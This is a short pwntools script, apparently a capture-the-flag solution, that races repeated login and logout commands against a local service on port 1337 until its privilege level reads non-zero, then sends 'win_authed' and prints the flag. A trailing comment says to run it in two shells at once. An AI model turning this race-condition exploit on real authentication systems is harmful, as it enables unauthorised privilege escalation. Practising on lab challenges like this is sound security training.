from pwn import *

r =  remote('0.0.0.0','1337')
r.recvuntil(b'Privilege level: ')
flag = 0
while True:
    r.sendline(b'login')
    r.recvuntil(b'Privilege level: ')
    for i in range(5):
        r.sendline(b'logout')
        r.recvuntil(b'Privilege level: ', timeout=0.2)
        a = r.recv(1)
        print(a)
        if a != b'0':
            flag = 1
            r.sendline(b'win_authed')
            break
    if flag == 1:
        break
r.recvuntil(b'flag:\n')
print(r.recvline())
r.close()

## shell 1 & 2 : python exp.py